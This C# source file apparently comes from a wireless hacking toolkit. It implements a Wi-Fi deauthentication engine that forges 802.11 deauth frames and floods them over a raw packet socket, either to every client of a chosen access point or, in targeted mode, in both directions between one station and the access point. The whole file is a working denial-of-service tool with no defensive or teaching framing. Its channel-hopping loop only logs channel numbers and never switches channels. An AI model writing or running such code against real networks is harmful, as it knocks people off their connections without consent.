using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace HackITWireless
{
    public class DeauthEngineV2
    {
        private readonly string _iface;
        private readonly byte[] _bssid;
        private readonly byte[] _station;
        private readonly ushort _reason;
        private readonly bool _targeted;
        private readonly List<int> _channels;
        private volatile bool _running;
        private long _sent;
        private Thread _worker;

        private static readonly byte[] Radiotap = {
            0x00, 0x00, 0x14, 0x00, 0x02, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00
        };

        public DeauthEngineV2(string iface, string bssid, string station = "FF:FF:FF:FF:FF:FF", ushort reason = 7)
        {
            _iface = iface;
            _bssid = ParseMac(bssid);
            _station = ParseMac(station);
            _reason = reason;
            _targeted = !station.Equals("FF:FF:FF:FF:FF:FF", StringComparison.OrdinalIgnoreCase);

            _channels = new List<int>();
            for (int i = 1; i <= 13; i++) _channels.Add(i);
            _channels.AddRange(new[] { 36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,149,153,157,161,165,169 });
        }

        public long Sent => Interlocked.Read(ref _sent);
        public bool Running => _running;

        public void Start()
        {
            if (_running) return;
            _running = true;
            _worker = new Thread(Loop) { IsBackground = true };
            _worker.Start();
            Console.Error.WriteLine($"[C#-v2] Deauth started on {_iface} -> {BitConverter.ToString(_bssid).Replace("-",":")} ({_channels.Count} ch)");
        }

        public void Stop()
        {
            _running = false;
            _worker?.Join(2000);
        }

        private byte[] BuildFrame(byte[] bssid, byte[] station, ushort reason, uint seq)
        {
            byte[] mgmt = new byte[26];
            mgmt[0] = 0xC0; mgmt[1] = 0x00;
            mgmt[2] = 0x3A; mgmt[3] = 0x01;
            Buffer.BlockCopy(station, 0, mgmt, 4, 6);
            Buffer.BlockCopy(bssid, 0, mgmt, 10, 6);
            Buffer.BlockCopy(bssid, 0, mgmt, 16, 6);
            ushort encSeq = (ushort)((seq << 4) & 0xFFFF);
            mgmt[22] = (byte)(encSeq & 0xFF);
            mgmt[23] = (byte)((encSeq >> 8) & 0xFF);
            mgmt[24] = (byte)(reason & 0xFF);
            mgmt[25] = (byte)((reason >> 8) & 0xFF);

            byte[] frame = new byte[Radiotap.Length + mgmt.Length];
            Buffer.BlockCopy(Radiotap, 0, frame, 0, Radiotap.Length);
            long ts = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() * 1000L;
            Buffer.BlockCopy(BitConverter.GetBytes(ts), 0, frame, 8, 8);
            Buffer.BlockCopy(mgmt, 0, frame, Radiotap.Length, mgmt.Length);
            return frame;
        }

        private void Loop()
        {
            int fd = RawSocketOpen(_iface);
            if (fd < 0) { _running = false; return; }

            uint seq = 0;
            int chIdx = 0;

            try
            {
                while (_running)
                {
                    int curCh = _channels[chIdx % _channels.Count];
                    chIdx++;

                    for (int i = 0; i < 64 && _running; i++)
                    {
                        byte[] f = BuildFrame(_bssid, _station, _reason, seq++);
                        if (RawSocketSend(fd, f) > 0)
                            Interlocked.Increment(ref _sent);

                        if (_targeted)
                        {
                            byte[] fc = BuildFrame(_station, _bssid, _reason, seq++);
                            if (RawSocketSend(fd, fc) > 0)
                                Interlocked.Increment(ref _sent);
                        }
                    }

                    if (_sent % 500 == 0)
                        Console.Error.WriteLine($"  [C#-v2] Deauth: {_sent} frames (ch {curCh})");
                }
            }
            catch { }
            finally { RawSocketClose(fd); }
        }

        private static int RawSocketOpen(string iface)
        {
            byte[] ifaceBytes = System.Text.Encoding.ASCII.GetBytes(iface + "\0");
            uint ifindex = if_nametoindex(ifaceBytes);
            if (ifindex == 0) return -1;

            int fd = socket(AF_PACKET, SOCK_RAW, (ETH_P_ALL << 8) | ETH_P_ALL);
            if (fd < 0) return -1;

            SockAddrLl addr = new SockAddrLl
            {
                sll_family = AF_PACKET,
                sll_protocol = (ushort)((ETH_P_ALL << 8) | ETH_P_ALL),
                sll_ifindex = (int)ifindex,
                sll_hatype = 0, sll_pkttype = 0, sll_halen = 0,
                sll_addr = new byte[8]
            };
            int r = bind(fd, ref addr, Marshal.SizeOf(addr));
            if (r < 0) { close(fd); return -1; }
            return fd;
        }

        private static int RawSocketSend(int fd, byte[] buf) => send(fd, buf, buf.Length, 0);
        private static void RawSocketClose(int fd) { if (fd >= 0) close(fd); }

        private static byte[] ParseMac(string mac)
        {
            string clean = mac.Replace(":", "").Replace("-", "").ToUpperInvariant();
            if (clean.Length != 12) throw new ArgumentException($"Invalid MAC: {mac}");
            byte[] bytes = new byte[6];
            for (int i = 0; i < 6; i++) bytes[i] = Convert.ToByte(clean.Substring(i * 2, 2), 16);
            return bytes;
        }

        private const int AF_PACKET = 17, SOCK_RAW = 3, ETH_P_ALL = 0x0003;

        [DllImport("libc", SetLastError = true)] private static extern int socket(int domain, int type, int protocol);
        [DllImport("libc", SetLastError = true)] private static extern int bind(int sockfd, ref SockAddrLl addr, int addrlen);
        [DllImport("libc", SetLastError = true)] private static extern int send(int sockfd, byte[] buf, int len, int flags);
        [DllImport("libc", SetLastError = true)] private static extern int close(int fd);
        [DllImport("libc", SetLastError = true)] private static extern uint if_nametoindex([In] byte[] ifname);

        private struct SockAddrLl
        {
            public ushort sll_family; public ushort sll_protocol; public int sll_ifindex;
            public ushort sll_hatype; public byte sll_pkttype; public byte sll_halen;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] sll_addr;
        }
    }
}
